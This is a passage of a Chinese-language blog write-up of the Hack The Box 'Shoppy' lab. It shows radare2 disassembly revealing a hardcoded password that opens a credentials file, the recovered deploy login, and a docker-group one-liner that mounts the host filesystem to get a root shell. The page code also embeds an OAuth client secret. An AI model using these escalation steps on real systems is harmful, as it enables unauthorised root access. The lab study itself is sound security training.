+0x000013eb    4 73           sym.__static_initialization_and_destruction_0_int__int_
+0x000010e0    1 6            sym.imp.std::ios_base::Init::Init__
+0x00001060    1 6            sym.imp.__cxa_atexit
+0x00001434    1 21           sym._GLOBAL__sub_I_main
+0x00001000    3 23           sym._init
+0x00001205    5 486  -&gt; 426  main
+0x000014b4    1 9            sym._fini
+0x00001450    4 93           sym.__libc_csu_init
+0x000014b0    1 1            sym.__libc_csu_fini
+0x00001030    1 6            sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::compare_std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char____const__const
+0x00001040    1 6            fcn.00001040
+0x00001050    1 6            sym.imp.system
+0x00001070    1 6            sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_
+0x00001080    1 6            sym.imp.std::basic_ostream_char__std::char_traits_char____std::operator____std::char_traits_char____std::basic_ostream_char__std::char_traits_char_____char_const_
+0x00001090    1 6            sym.imp.std::ostream::operator___std::ostream____std::ostream__
+0x000010a0    1 6            fcn.000010a0
+0x000010b0    1 6            sym.imp.std::basic_istream_char__std::char_traits_char____std::operator___char__std::char_traits_char___std::allocator_char____std::basic_istream_char__std::char_traits_char_____std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char____
+0x000010c0    1 6            sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::basic_string_char_const__std::allocator_char__const_
+0x000010d0    1 6            sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::basic_string__
+0x000010f0    1 6            sym.imp._Unwind_Resume
+0x00001100    1 6            sym.imp.std::allocator_char_::allocator__
+</code></pre>
+<p>使用函数 <code>aaa</code> 自动分析并命名函数，使用函数 <code>afl</code> 查看程序内的函数</p>
+<p>这里找到了 main 函数，然后去到 main 函数的地址并查看汇编代码</p>
+<pre><code class="bash">[0x00001120]&gt; s main
+[0x00001205]&gt; pdf
+            ; DATA XREF from entry0 @ 0x113d
+┌ 426: int main (int argc, char **argv, char **envp);
+│           ; var int64_t var_60h @ rbp-0x60
+│           ; var int64_t var_40h @ rbp-0x40
+│           ; var int64_t var_11h @ rbp-0x11
+│           ; var int64_t var_8h @ rbp-0x8
+│           0x00001205      55             push rbp
+│           0x00001206      4889e5         mov rbp, rsp
+│           0x00001209      53             push rbx
+│           0x0000120a      4883ec58       sub rsp, 0x58
+│           0x0000120e      488d35fb0d00.  lea rsi, str.Welcome_to_Josh_password_manager_ ; 0x2010 ; &quot;Welcome to Josh password manager!&quot;
+│           0x00001215      488d3da42e00.  lea rdi, obj.std::cout      ; sym..bss
+│                                                                      ; 0x40c0                                                                                                                                    
+│           0x0000121c      e85ffeffff     call sym std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp; std::operator&lt;&lt; &lt;std::char_traits&lt;char&gt; &gt;(std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp;, char const*) ; sym.imp.std::basic_ostream_char__std::char_traits_char____std::operator____std::char_traits_char____std::basic_ostream_char__std::char_traits_char_____char_const_                                                
+│           0x00001221      4889c2         mov rdx, rax
+│           0x00001224      488b05a52d00.  mov rax, qword [method.std::basic_ostream_char__std::char_traits_char____std::endl_char__std.char_traits_char____std::basic_ostream_char__std::char_traits_char____] ; [0x3fd0:8]=0                                                                                                                                                                                                        
+│           0x0000122b      4889c6         mov rsi, rax
+│           0x0000122e      4889d7         mov rdi, rdx
+│           0x00001231      e85afeffff     call sym std::ostream::operator&lt;&lt;(std::ostream&amp; (*)(std::ostream&amp;)) ; sym.imp.std::ostream::operator___std::ostream____std::ostream__
+│           0x00001236      488d35fb0d00.  lea rsi, str.Please_enter_your_master_password:_ ; 0x2038 ; &quot;Please enter your master password: &quot;
+│           0x0000123d      488d3d7c2e00.  lea rdi, obj.std::cout      ; sym..bss
+│                                                                      ; 0x40c0                                                                                                                                    
+│           0x00001244      e837feffff     call sym std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp; std::operator&lt;&lt; &lt;std::char_traits&lt;char&gt; &gt;(std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp;, char const*) ; sym.imp.std::basic_ostream_char__std::char_traits_char____std::operator____std::char_traits_char____std::basic_ostream_char__std::char_traits_char_____char_const_                                                
+│           0x00001249      488d45c0       lea rax, [var_40h]
+│           0x0000124d      4889c7         mov rdi, rax
+│           0x00001250      e87bfeffff     call sym std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::basic_string() ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::basic_string__                                                                                                                                                                         
+│           0x00001255      488d45c0       lea rax, [var_40h]
+│           0x00001259      4889c6         mov rsi, rax
+│           0x0000125c      488d3d7d2f00.  lea rdi, obj.std::cin       ; 0x41e0
+│           0x00001263      e848feffff     call sym std::basic_istream&lt;char, std::char_traits&lt;char&gt; &gt;&amp; std::operator&gt;&gt;&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;(std::basic_istream&lt;char, std::char_traits&lt;char&gt; &gt;&amp;, std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;&amp;) ; sym.imp.std::basic_istream_char__std::char_traits_char____std::operator___char__std::char_traits_char___std::allocator_char____std::basic_istream_char__std::char_traits_char_____std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char____                                                                   
+│           0x00001268      488d45ef       lea rax, [var_11h]
+│           0x0000126c      4889c7         mov rdi, rax
+│           0x0000126f      e88cfeffff     call sym std::allocator&lt;char&gt;::allocator() ; sym.imp.std::allocator_char_::allocator__
+│           0x00001274      488d55ef       lea rdx, [var_11h]
+│           0x00001278      488d45a0       lea rax, [var_60h]
+│           0x0000127c      488d35d90d00.  lea rsi, [0x0000205c]
+│           0x00001283      4889c7         mov rdi, rax
+│           0x00001286      e835feffff     call sym std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::basic_string(char const*, std::allocator&lt;char&gt; const&amp;) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::basic_string_char_const__std::allocator_char__const_                                                                                           
+│           0x0000128b      488d45ef       lea rax, [var_11h]
+│           0x0000128f      4889c7         mov rdi, rax
+│           0x00001292      e809feffff     call fcn.000010a0
+│           0x00001297      488d45a0       lea rax, [var_60h]
+│           0x0000129b      488d35bb0d00.  lea rsi, str.Sample         ; 0x205d ; u&quot;Sample&quot;
+│           0x000012a2      4889c7         mov rdi, rax
+│           0x000012a5      e8c6fdffff     call sym std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_                                                                                                                                                          
+│           0x000012aa      488d45a0       lea rax, [var_60h]
+│           0x000012ae      488d35aa0d00.  lea rsi, [0x0000205f]       ; u&quot;ample&quot;
+│           0x000012b5      4889c7         mov rdi, rax
+│           0x000012b8      e8b3fdffff     call sym std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_                                                                                                                                                          
+│           0x000012bd      488d45a0       lea rax, [var_60h]
+│           0x000012c1      488d35990d00.  lea rsi, [0x00002061]       ; u&quot;mple&quot;
+│           0x000012c8      4889c7         mov rdi, rax
+│           0x000012cb      e8a0fdffff     call sym std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_                                                                                                                                                          
+│           0x000012d0      488d45a0       lea rax, [var_60h]
+│           0x000012d4      488d35880d00.  lea rsi, [0x00002063]       ; u&quot;ple&quot;
+│           0x000012db      4889c7         mov rdi, rax
+│           0x000012de      e88dfdffff     call sym std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_                                                                                                                                                          
+│           0x000012e3      488d45a0       lea rax, [var_60h]
+│           0x000012e7      488d35770d00.  lea rsi, [0x00002065]       ; u&quot;le&quot;
+│           0x000012ee      4889c7         mov rdi, rax
+│           0x000012f1      e87afdffff     call sym std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_                                                                                                                                                          
+│           0x000012f6      488d45a0       lea rax, [var_60h]
+│           0x000012fa      488d35660d00.  lea rsi, [0x00002067]       ; &quot;e&quot;
+│           0x00001301      4889c7         mov rdi, rax
+│           0x00001304      e867fdffff     call sym std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_                                                                                                                                                          
+│           0x00001309      488d55a0       lea rdx, [var_60h]
+│           0x0000130d      488d45c0       lea rax, [var_40h]
+│           0x00001311      4889d6         mov rsi, rdx
+│           0x00001314      4889c7         mov rdi, rax
+│           0x00001317      e814fdffff     call sym std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::compare(std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt; const&amp;) const ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::compare_std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char____const__const                                                                                                                                                                                                               
+│           0x0000131c      85c0           test eax, eax
+│           0x0000131e      0f94c0         sete al
+│           0x00001321      84c0           test al, al
+│       ┌─&lt; 0x00001323      743b           je 0x1360
+│       │   0x00001325      488d35440d00.  lea rsi, str.Access_granted__Here_is_creds__ ; 0x2070 ; &quot;Access granted! Here is creds !&quot;
+│       │   0x0000132c      488d3d8d2d00.  lea rdi, obj.std::cout      ; sym..bss
+│       │                                                              ; 0x40c0                                                                                                                                    
+│       │   0x00001333      e848fdffff     call sym std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp; std::operator&lt;&lt; &lt;std::char_traits&lt;char&gt; &gt;(std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp;, char const*) ; sym.imp.std::basic_ostream_char__std::char_traits_char____std::operator____std::char_traits_char____std::basic_ostream_char__std::char_traits_char_____char_const_                                                
+│       │   0x00001338      4889c2         mov rdx, rax
+│       │   0x0000133b      488b058e2c00.  mov rax, qword [method.std::basic_ostream_char__std::char_traits_char____std::endl_char__std.char_traits_char____std::basic_ostream_char__std::char_traits_char____] ; [0x3fd0:8]=0                                                                                                                                                                                                        
+│       │   0x00001342      4889c6         mov rsi, rax
+│       │   0x00001345      4889d7         mov rdi, rdx
+│       │   0x00001348      e843fdffff     call sym std::ostream::operator&lt;&lt;(std::ostream&amp; (*)(std::ostream&amp;)) ; sym.imp.std::ostream::operator___std::ostream____std::ostream__
+│       │   0x0000134d      488d3d3c0d00.  lea rdi, str.cat__home_deploy_creds.txt ; 0x2090 ; &quot;cat /home/deploy/creds.txt&quot; ; const char *string
+│       │   0x00001354      e8f7fcffff     call sym.imp.system         ; int system(const char *string)
+│       │   0x00001359      bb00000000     mov ebx, 0
+│      ┌──&lt; 0x0000135e      eb2d           jmp 0x138d
+│      ││   ; CODE XREF from main @ 0x1323
+│      │└─&gt; 0x00001360      488d35490d00.  lea rsi, str.Access_denied__This_incident_will_be_reported__ ; 0x20b0 ; &quot;Access denied! This incident will be reported !&quot;
+│      │    0x00001367      488d3d522d00.  lea rdi, obj.std::cout      ; sym..bss
+│      │                                                               ; 0x40c0                                                                                                                                    
+│      │    0x0000136e      e80dfdffff     call sym std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp; std::operator&lt;&lt; &lt;std::char_traits&lt;char&gt; &gt;(std::basic_ostream&lt;char, std::char_traits&lt;char&gt; &gt;&amp;, char const*) ; sym.imp.std::basic_ostream_char__std::char_traits_char____std::operator____std::char_traits_char____std::basic_ostream_char__std::char_traits_char_____char_const_                                                
+│      │    0x00001373      4889c2         mov rdx, rax
+│      │    0x00001376      488b05532c00.  mov rax, qword [method.std::basic_ostream_char__std::char_traits_char____std::endl_char__std.char_traits_char____std::basic_ostream_char__std::char_traits_char____] ; [0x3fd0:8]=0                                                                                                                                                                                                        
+│      │    0x0000137d      4889c6         mov rsi, rax
+│      │    0x00001380      4889d7         mov rdi, rdx
+│      │    0x00001383      e808fdffff     call sym std::ostream::operator&lt;&lt;(std::ostream&amp; (*)(std::ostream&amp;)) ; sym.imp.std::ostream::operator___std::ostream____std::ostream__
+│      │    0x00001388      bb01000000     mov ebx, 1
+│      │    ; CODE XREF from main @ 0x135e
+│      └──&gt; 0x0000138d      488d45a0       lea rax, [var_60h]
+│           0x00001391      4889c7         mov rdi, rax
+│           0x00001394      e8a7fcffff     call fcn.00001040
+│           0x00001399      488d45c0       lea rax, [var_40h]
+│           0x0000139d      4889c7         mov rdi, rax
+│           0x000013a0      e89bfcffff     call fcn.00001040
+│           0x000013a5      89d8           mov eax, ebx
+│       ┌─&lt; 0x000013a7      eb3c           jmp 0x13e5
+..
+      │││   ; CODE XREFS from main @ +0x1b3, +0x1c4
+│       │   ; CODE XREF from main @ 0x13a7
+│       └─&gt; 0x000013e5      488b5df8       mov rbx, qword [var_8h]
+│           0x000013e9      c9             leave
+└           0x000013ea      c3             ret
+</code></pre>
+<p>使用函数 <code>s main</code> 定位到 main 函数的地址，使用函数 <code>pdf</code> 查看当前函数的汇编代码</p>
+<pre><code class="bash">0x0000120e      488d35fb0d00.  lea rsi, str.Welcome_to_Josh_password_manager_ ; 0x2010 ; &quot;Welcome to Josh password manager!&quot;
+</code></pre>
+<p>这是一个 c++ 写的程序，运行程序之后会输出 “Welcome to Josh password manager!” 字符串</p>
+<pre><code class="bash">0x00001236      488d35fb0d00.  lea rsi, str.Please_enter_your_master_password:_ ; 0x2038 ; &quot;Please enter your master password: &quot;
+</code></pre>
+<p>然后输出 “Please enter your master password: “ 字符串，并接受我们的输入</p>
+<pre><code class="bash">│           0x0000129b      488d35bb0d00.  lea rsi, str.Sample         ; 0x205d ; u&quot;Sample&quot;
+│           0x000012a2      4889c7         mov rdi, rax
+│           0x000012a5      e8c6fdffff     call sym std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_                                                                                                                                                          
+│           0x000012aa      488d45a0       lea rax, [var_60h]
+│           0x000012ae      488d35aa0d00.  lea rsi, [0x0000205f]       ; u&quot;ample&quot;
+│           0x000012b5      4889c7         mov rdi, rax
+│           0x000012b8      e8b3fdffff     call sym std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_                                                                                                                                                          
+│           0x000012bd      488d45a0       lea rax, [var_60h]
+│           0x000012c1      488d35990d00.  lea rsi, [0x00002061]       ; u&quot;mple&quot;
+│           0x000012c8      4889c7         mov rdi, rax
+│           0x000012cb      e8a0fdffff     call sym std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_                                                                                                                                                          
+│           0x000012d0      488d45a0       lea rax, [var_60h]
+│           0x000012d4      488d35880d00.  lea rsi, [0x00002063]       ; u&quot;ple&quot;
+│           0x000012db      4889c7         mov rdi, rax
+│           0x000012de      e88dfdffff     call sym std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_                                                                                                                                                          
+│           0x000012e3      488d45a0       lea rax, [var_60h]
+│           0x000012e7      488d35770d00.  lea rsi, [0x00002065]       ; u&quot;le&quot;
+│           0x000012ee      4889c7         mov rdi, rax
+│           0x000012f1      e87afdffff     call sym std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_                                                                                                                                                          
+│           0x000012f6      488d45a0       lea rax, [var_60h]
+│           0x000012fa      488d35660d00.  lea rsi, [0x00002067]       ; &quot;e&quot;
+│           0x00001301      4889c7         mov rdi, rax
+│           0x00001304      e867fdffff     call sym std::__cxx11::basic_string&lt;char, std::char_traits&lt;char&gt;, std::allocator&lt;char&gt; &gt;::operator+=(char const*) ; sym.imp.std::__cxx11::basic_string_char__std::char_traits_char___std::allocator_char___::operator_char_const_
+</code></pre>
+<p>接着，程序会和我们输入的字符串和 Sample 字符一个一个的做对比</p>
+<pre><code class="bash">0x00001325      488d35440d00.  lea rsi, str.Access_granted__Here_is_creds__ ; 0x2070 ; &quot;Access granted! Here is creds !&quot;
+0x0000134d      488d3d3c0d00.  lea rdi, str.cat__home_deploy_creds.txt ; 0x2090 ; &quot;cat /home/deploy/creds.txt&quot; ; const char *string
+</code></pre>
+<p>我们输入的字符串是 Sample 后，会输出 “Access granted! Here is creds !” 字符串，表示我们输入正确，然后会执行一个系统命令 “cat &#x2F;home&#x2F;deploy&#x2F;creds.txt”，查看文件 &#x2F;home&#x2F;deploy&#x2F;creds.txt 的内容。</p>
+<p>现在我们回到靶机，来执行一下</p>
+<pre><code class="bash">jaeger@shoppy:/home/deploy$ sudo -u deploy ./password-manager
+[sudo] password for jaeger: 
+Welcome to Josh password manager!
+Please enter your master password: Sample
+Access granted! Here is creds !
+Deploy Creds :
+username: deploy
+password: Deploying@pp!
+</code></pre>
+<p>得到了一个账号密码，然后使用这个账号密码切换到用户 deploy</p>
+<pre><code class="bash">jaeger@shoppy:/home/deploy$ su deploy
+Password: 
+$ whoami&amp;&amp;id
+deploy
+uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
+</code></pre>
+<p>成功提权到 deploy 用户</p>
+<h2 id="Docker-越权"><a href="#Docker-越权" class="headerlink" title="Docker 越权"></a>Docker 越权</h2><blockquote>
+<p><a href="https://gtfobins.github.io/gtfobins/docker/" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/docker/</a></p>
+</blockquote>
+<blockquote>
+<p>查询提权帮助</p>
+</blockquote>
+<img src="/2022/09/17/Hackthebox/Easy/Hackthebox-Shoppy/8bG08PtQP0JeDHKrF9xon1QswWhY2CQlAiZuN0OKAzA.png" class title="image">
+
+<p>我们尝试一下是否可行</p>
+<pre><code class="bash">docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+</code></pre>
+<pre><code class="bash">$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh  
+# whoami&amp;&amp;id
+root
+uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
+</code></pre>
+<p>成功越权到 root 权限</p>
+<pre><code class="bash"># cat /root/root.txt
+e95c041905b2bb2a8fcbb6d9327e9d64
+</code></pre>
+<p>成功拿到 root 权限的 flag 文件</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <footer>
+        <a href="http://www.lucifiel.com">
+            <img src="/img/avatar.jpg" alt="Lucifiel">
+            Lucifiel
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Hackthebox/" rel="tag">Hackthebox</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/09/17/Hackthebox/Easy/Hackthebox-Shoppy/&title=《Shoppy - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/09/17/Hackthebox/Easy/Hackthebox-Shoppy/&title=《Shoppy - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/09/17/Hackthebox/Easy/Hackthebox-Shoppy/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Shoppy - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/09/17/Hackthebox/Easy/Hackthebox-Shoppy/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/09/17/Hackthebox/Easy/Hackthebox-Shoppy/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2022/09/20/Hackthebox/Easy/Hackthebox-FriendZone/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">FriendZone - Hackthebox</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2022/09/05/Hackthebox/Easy/Hackthebox-Help/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Help - Hackthebox</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'cf0a9809323df14a9168',
+          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
+          repo: 'LucifielHack.github.io',
+          owner: 'LucifielHack',
+          admin: ['LucifielHack'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            <!--- 
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>footer.license</span> --->
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Lucifiel &copy; 2020 - 2023</span>
+            <span>
+                
+                Power by Lucifiel</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2022/09/17/Hackthebox/Easy/Hackthebox-Shoppy/&title=《Shoppy - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2022/09/17/Hackthebox/Easy/Hackthebox-Shoppy/&title=《Shoppy - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2022/09/17/Hackthebox/Easy/Hackthebox-Shoppy/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Shoppy - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2022/09/17/Hackthebox/Easy/Hackthebox-Shoppy/&via=http://www.lucifiel.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2022/09/17/Hackthebox/Easy/Hackthebox-Shoppy/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACw0lEQVR42u3cwW7bQAwE0Pz/T7tATy5QJzPkrpOiTycjTiS9NaClh0Q+PuLj8ft4fv18vPr587vt2ZJ3jx14eHh4o1v//OY+f93iX109OUN+z3h4eHi3ecnjO98Aisu/uIdkEZPz4OHh4X0vL3/Q5wV6fn48PDy8f5F3O+CYvcbDw8P7Ll4SRiQbQ1so5/Hu9awFDw8Pr0sD3vQQv7EZ/KA9Cg8P7z/gPRZHGz0ksUUbB39xh3h4eHgXeHlxPHsat8FB8rf1EuPh4eFd4OUV6exh3d56+wEMwXh4eHgLXjtElbf2Z0V5cvVkuAEPDw/vBi9/4ObNsBbcRsbFmBceHh7eBV67PWwumY8dtIsVRSp4eHh4h3iz0nm2KG3DbNNO+6O/h4eHh3eB14awOWYzFrBZxGLuAA8PD2/Na4PdWYetHpwqRwRebgx4eHh4a95m4CkPefOxgFn0UHf58PDw8A7x9s2tvImVtMeSTSg/Ax4eHt4N3tkLtOz9ktX9PTw8PLwFL29xJcXxJkFtS/PhdwU8PDy8NW/zWG+HBpLfz5cvHyzAw8PDO8XbjAi020PSrGqj3i+uiIeHh3eZ12I+b4/lLbS8uK+XEg8PD+8Cbxae7pv67VBCW4L/5TPEw8PDu8Brw9w8RMhHE9ot50BnDw8PD2+eshb/gKnNifMCOl/itljHw8PDeydv08jfN7Tysr7ILfDw8PDWvFk521atyYjVpg2Gh4eH935ecvnZqMHZiLbd3vDw8PDO8h7lsS9/T4W50d/i4eHhXeCt9pMg8G2L4Pym9wNbeHh4eBve2c2gXZRZrz9vm+Hh4eHd4+Xxbr4N5Is13K+SM+Dh4eH9AF4S8uZL0y5iHj3j4eHh/QRee+uzUYNNBIyHh4f3Tl7e/k9Omv8kHzVY1dp4eHh4R3ntV/02Tp0NWp0d3sLDw8M7xPsF0P3aT3Ej850AAAAASUVORK5CYII=" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
